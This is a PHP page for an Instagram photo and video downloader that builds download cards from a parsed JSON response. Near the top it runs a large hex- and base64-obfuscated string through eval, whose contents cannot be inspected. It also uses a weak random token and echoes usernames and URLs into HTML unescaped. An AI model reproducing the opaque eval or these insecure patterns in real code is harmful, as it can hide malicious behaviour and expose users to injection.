<div class="row justify-content-center">
<?php
error_reporting(E_ERROR | E_PARSE);
include 'base.php';
include 'config/cookie.php';
session_start();
$token = md5(rand(1000,9999));
$_SESSION['dl_token_id'] = $token;

  eval(gcode("\x53\x6bl3b\x6dx\x68T\x55\x31ac\x33hNallHdmNaYT\x4a\x4c\x54\x55\x68\x52\x4dU1\x36\x53\x53\x39qQ\x56\x6c\x5a\x64\x33B\x56\x4e0d\x52\x56E\x52\x61\x52\x54c\x35\x5a\x46AwZX\x453YjFXeEYr\x52\x54Z\x70\x64\x6b\x4a\x45R\x30\x6f3M\x56\x70L\x53m\x6b\x35YU\x64\x43\x4b1BpNl\x49vd1EvY\x6eV\x57\x63\x69\x73r\x63\x6eRB\x55\x55\x74iW\x56Y1\x54F\x70\x78\x5a\x30\x46rW\x47Z\x4f\x63\x31\x46P\x55\x43tFZ\x31h\x6bd\x7aN\x46\x65U0\x78\x4e\x47Q\x78Rm\x67v\x61\x6c\x6fy\x5a\x69\x39y\x4eV\x46M\x57U\x59\x7aaF\x42\x72W\x57\x6c\x70\x4ek\x564b\x48\x5aL\x551\x42\x44\x4c1\x64\x68\x61\x48N\x48c\x57dC\x57\x48BBL0\x56maH\x41x\x4dk\x68lU0\x31\x49M\x45h\x46S\x48Ro\x63\x30\x341eW\x394Z\x30d\x36d\x30\x674b1p\x45Z3VUO\x57\x56\x36\x5aUVmb\x55\x640\x64k\x4a\x74\x62\x6d\x49\x31\x59\x6e\x5a\x79\x53H\x5a\x53V\x57\x52\x57\x65\x48\x5ak\x51y\x73\x79\x63l\x56\x45\x4ez\x55\x34\x631\x64PU\x6dE\x33V\x48F\x76\x51\x6aBhZWxl\x4e\x45\x6b\x33M\x32pRa\x6b\x78\x77\x55n\x51\x33\x5a\x46hPd\x6b\x350UlV\x5aN\x30\x52\x31K\x33R\x50\x55\x7aI0\x4eW\x64P\x62\x57xi\x51\x6c\x4es\x4e\x6d9\x4d\x56n\x56T\x59\x54\x46TSj\x6c\x76W\x46R\x78MzND\x56\x6bJ\x68\x620Z\x53VlJ\x36\x531J\x77\x65\x44\x52\x6d\x5aHhEbVN\x51\x61G\x5a\x56e\x6b\x64Rd\x31V1\x53U\x59\x79\x52\x45s\x79V\x6aczaW\x74\x79UD\x6c\x34\x54Whva2xJc3B\x74\x55n\x45v\x51\x6b\x461b\x6dNE\x62FF\x79\x61\x6e\x4dwVlNnbz\x551\x55\x69\x39i\x4dm\x52\x4eZD\x6b\x33\x57\x6a\x6c\x55\x4b\x32\x70\x4d\x65E\x39Q\x57\x55\x38\x30SD\x5ar\x54\x31\x70\x7aVm\x4e\x42\x54\x33\x5az\x56\x56\x5avN\x55RFS\x6b\x56L\x5a0N0\x4dVQ0\x5aH\x68ZT\x4790M\x7a\x67\x78\x4dH\x56L\x53\x31\x49\x72Y0xLL\x33\x68\x48\x53V\x64\x46\x4ezJ\x46\x64\x54Nw\x57Wp\x44\x65U\x4e\x32M\x6cd\x6aTk\x4a\x57eXI\x32a\x45\x78\x68\x62X\x5aBRU\x6c\x75M\x6bFNaXQ\x77\x5amJ\x43Wm\x6cF\x4b\x30\x39\x36\x53\x6d\x64\x5a\x64Cs\x32Q\x57tY\x57kV\x4bR\x54\x63\x34\x52\x6d\x5a\x42a\x47\x46\x57\x5aFFBLz\x4a\x78W\x47F\x4aa\x32x0UzZ\x5aWC9\x76d\x57N\x31\x4d\x55\x680W\x6a\x46\x6fb\x6d\x52\x33\x52l\x4d\x79M\x58VUZm\x39P\x4d2cyUFgw\x4b\x30\x68\x32\x65FF\x49Uk\x5a\x4eZ\x6ac\x79\x62\x54Z0Q\x55\x39Sbl\x4dy\x59\x58l\x78\x57\x6d9\x4e\x4d1\x63zdF\x5aKU\x48hk\x64\x6d\x52\x53QlE\x76\x53\x44l\x4bWk9\x35U\x48\x56\x45\x4d\x48\x64u\x54T\x59\x79N\x58l\x58Q\x56\x56hZ\x6c\x510c\x539\x6f\x64\x47\x746Q\x57\x68\x5acU\x390\x4dF\x4d\x35N\x7aUyb\x55\x701b\x47\x515d\x55NRS\x57\x4d\x35ME\x35n\x51\x56\x5a\x32\x64\x6e\x4a\x6dT\x45\x56\x57Z\x571\x57Y\x6a\x6c\x51\x59j\x46mQ3\x6by\x63m5\x73\x51\x58N\x53\x51\x30\x4a\x4d\x4b2N\x35dT\x4ew\x52\x46FKOD\x56\x54e\x46\x5a\x35Rm\x5a\x51\x53\x45\x35\x79d1\x68F\x4f\x55lP\x56\x55\x46S\x56\x47t1T\x46\x5a\x6fa\x6cR6a3\x51\x76Z\x55F\x36\x65\x6a\x56CV\x55\x6bxW\x45pm\x56zY\x78\x4f\x56J\x4db\x46\x4a\x6e\x65FR\x47\x63\x6aNY"));

  $get_token = base64url_decode(strrev($_POST['token']));
  if($get_token == true && $get_token == $_SESSION['get_token']){
  
$arr = json_decode($jsonobj, true);

  $username = $arr["items"][0]["user"]["username"];
  $profile_pic_url = $arr["items"][0]["user"]["profile_pic_url"];
  
if($arr["items"][0]["video_versions"][0]["url"] == true || $arr["items"][0]["carousel_media"][0]["video_versions"][0]["url"] == true || $arr["items"][0]["carousel_media"][0]["image_versions2"]["candidates"][0]["url"] == true || $arr["items"][0]["image_versions2"]["candidates"][0]["url"] == true){

  if($arr["items"][0]["video_versions"] == true){
    $type = ".mp4";
    $url = $arr["items"][0]["video_versions"][0]["url"];
    $json = '{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$url.'"}';
    $base = strrev(base64url_encode($json));
    $dl_url = "dl.php?token=".$base;
    ?>

  			<div class="col-md-4 mt-4">
            <div class="card">
              <div class="card-header text-start">
                <div class="d-inline"><img class="w-12 rounded-circle" src="<?php echo "dl.php?token=".strrev(base64url_encode('{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$profile_pic_url.'"}')) ?>">
                <div class="ml-3 d-inline"><span class="mx-1"><?php echo $username ?></span></div>
                </div>
              </div>
              <div class="card-body text-center">
                <div class="ig-dl-container">
                <video controls>
                  <source src="<?php echo $dl_url ?>" type="video/mp4">
                </video>
                </div>
                <a href="<?php echo $dl_url ?>" class="btn btn-primary mt-3 w-90">Download Video</a>
              </div>
            </div>
			</div>

        <?php
  }
  else{
    $carousel_media_count = $arr["items"][0]["carousel_media_count"];
    $count = $carousel_media_count - 1;
      if($carousel_media_count > 0){
        for ($x = 0; $x <= $count; $x++) {
          if($arr["items"][0]["carousel_media"][$x]["video_versions"] == true){
            $type = ".mp4";
            $url = $arr["items"][0]["carousel_media"][$x]["video_versions"][0]["url"];
            $json = '{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$url.'"}';
            $base = strrev(base64url_encode($json));
            $dl_url = "dl.php?token=".$base;
    		?>

  			<div class="col-md-4 mt-4">
            <div class="card">
              <div class="card-header text-start">
                <div class="d-inline"><img class="w-12 rounded-circle" src="<?php echo "dl.php?token=".strrev(base64url_encode('{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$profile_pic_url.'"}')) ?>">
                <div class="ml-3 d-inline"><span class="mx-1"><?php echo $username ?></span></div>
                </div>
              </div>
              <div class="card-body text-center">
                <div class="ig-dl-container">
                <video controls>
                  <source src="<?php echo $dl_url ?>" type="video/mp4">
                </video>
                </div>
                <a href="<?php echo $dl_url ?>" class="btn btn-primary mt-3 w-90">Download Video</a>
              </div>
  			</div>
			</div>

        <?php
          }
          else{
            $type = ".jpg";
            $url = $arr["items"][0]["carousel_media"][$x]["image_versions2"]["candidates"][0]["url"];
            $json = '{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$url.'"}';
            $base = strrev(base64url_encode($json));
            $dl_url = "dl.php?token=".$base;
    		?>

  			<div class="col-md-4 mt-4">
			<div class="card">
              <div class="card-header text-start">
                <div class="d-inline"><img class="w-12 rounded-circle" src="<?php echo "dl.php?token=".strrev(base64url_encode('{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$profile_pic_url.'"}')) ?>">
                <div class="ml-3 d-inline"><span class="mx-1"><?php echo $username ?></span></div>
                </div>
              </div>
              <div class="card-body text-center">
                <img class="ig-dl-img" src="<?php echo $dl_url ?>">
                <a href="<?php echo $dl_url ?>" class="btn btn-primary mt-3 w-90">Download Photo</a>
              </div>
            </div>
  			</div>

			<?php
          }
        }
      }
      else{
        $type = ".jpg";
        $url = $arr["items"][0]["image_versions2"]["candidates"][0]["url"];
        $json = '{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$url.'"}';
        $base = strrev(base64url_encode($json));
        $dl_url = "dl.php?token=".$base;
        ?>

  		<div class="col-md-4 mt-4">
		<div class="card">
          <div class="card-header text-start">
            <div class="d-inline"><img class="w-12 rounded-circle" src="<?php echo "dl.php?token=".strrev(base64url_encode('{"token":"'.$token.'","username":"'.$username.'","type":"'.$type.'","url":"'.$profile_pic_url.'"}')) ?>">
            <div class="ml-3 d-inline"><span class="mx-1"><?php echo $username ?></span></div>
            </div>
          </div>
          <div class="card-body text-center">
            <img class="ig-dl-img" src="<?php echo $dl_url ?>">
            <a href="<?php echo $dl_url ?>" class="btn btn-primary mt-3 w-90">Download Photo</a>
          </div>
        </div>
  		</div>

        <?php
      }
    }
    }
  else{
  echo '<div class="alert text-center alert-danger w-auto mtb-5" role="alert"><strong>Ooops, please enter a valid Instagram link!!</strong></div>';
  }
  }
  else {
  echo "invalid token!";
  }
?>
	</div>